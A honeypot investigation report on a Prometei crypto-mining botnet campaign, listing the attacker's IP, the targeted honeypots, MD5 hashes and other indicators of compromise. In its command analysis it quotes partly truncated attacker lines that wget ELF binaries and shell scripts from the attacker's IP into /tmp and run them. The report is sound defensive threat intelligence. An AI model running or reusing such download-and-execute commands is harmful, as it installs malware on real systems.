### **Honeypot Attack Research Report: Prometei Crypto Mining Investigation (Revised)**

**Report Generation Time:** 2025-11-02T16:18:58.152222Z

**Timeframe of Investigation:** 2025-09-28T00:00:00.000Z - 2025-10-28T23:59:59.999Z

**Files Used to Generate Report:**
*   Internal Honeypot Logs (queried via `kibanna_discover_query` and `match_query`)
*   External Threat Intelligence (via `search_agent`)

---

### **Executive Summary**

This report details a successful investigation into a series of attacks targeting our honeypot network, confirming activity consistent with the Prometei crypto-mining botnet. A threat actor, operating from IP address **94.156.152.237**, executed multiple malicious commands across our honeypots. The activity involved downloading and executing several malicious files, including ELF binaries (`x86`, `bot`) and downloader shell scripts (`wget.sh`, `w.sh`). This behavior aligns with the known Tactics, Techniques, and Procedures (TTPs) of the Prometei malware.

---

### **Investigation Details**

The investigation confirmed the execution of all three command-line inputs provided by the user.

**1. Command Execution Analysis:**

*   **Command 1:** `cd /tmp || ... wget http://94.156.152.237/bins/x86; ...`
    *   **Finding:** Observed on **2025-10-19T14:31:04.036Z** targeting the `sens-tel` honeypot (34.165.197.224). This command downloads and executes the ELF binary `x86`.

*   **Command 2:** `cd /tmp || ... wget http://94.156.152.237/wget.sh; ... wget http://94.156.152.237/w.sh; ...`
    *   **Finding:** Three instances of this command were executed on **2025-10-25** against the `sens-tai` and `sens-ny` honeypots. This command uses downloader scripts (`wget.sh`, `w.sh`) to fetch further payloads.

*   **Command 3:** `cd /tmp || ... wget http://94.156.152.237:6677/bot; ...`
    *   **Finding:** Observed on **2025-10-20T19:59:08.356Z** targeting the `sens-ny` honeypot (161.35.180.163). This command downloads and executes the ELF binary `bot`.

**2. Attacker Infrastructure Analysis:**

All commands used a single source IP for payload delivery: **94.156.152.237**.

*   **ASN Information:** The IP is registered to **AS214209, Internet Magnate (Pty) Ltd** in Bulgaria.
*   **Suricata Alerts:** Multiple Suricata alerts, including **"ET INFO Executable and linking format (ELF) file download Over HTTP"**, were triggered by traffic from this IP.
*   **Downloaded Files:** Log analysis confirms the download of `x86`, `bot`, `sigma.sh`, `wget.sh`, and `w.sh`.

**3. Correlation with Prometei Malware:**

The observed TTPs—using temporary directories, employing both direct ELF downloads and intermediate shell scripts, and targeting Linux systems—are highly characteristic of the Prometei botnet's infection process.

---

### **Indicators of Compromise (IOCs)**

*   **Attacker IP Address:** `94.156.152.237`
*   **File Names:** `x86`, `bot`, `sigma.sh`, `wget.sh`, `w.sh`
*   **File Hashes (MD5):**
    *   `4b0ec31e54fcac73a31e2342f7e07b1d` (bot)
    *   `599161e66c1fc12760ee9a4031a35b7f` (sigma.sh)
*   **Attacked Honeypots:** `sens-tel`, `sens-ny`, `sens-tai`

---

### **Conclusion**

The evidence confirms that our honeypot network was targeted by the Prometei botnet from IP address **94.156.152.237**. The attacker used a multi-stage approach involving downloader scripts and ELF binaries. It is recommended to block the identified IP and file hashes.
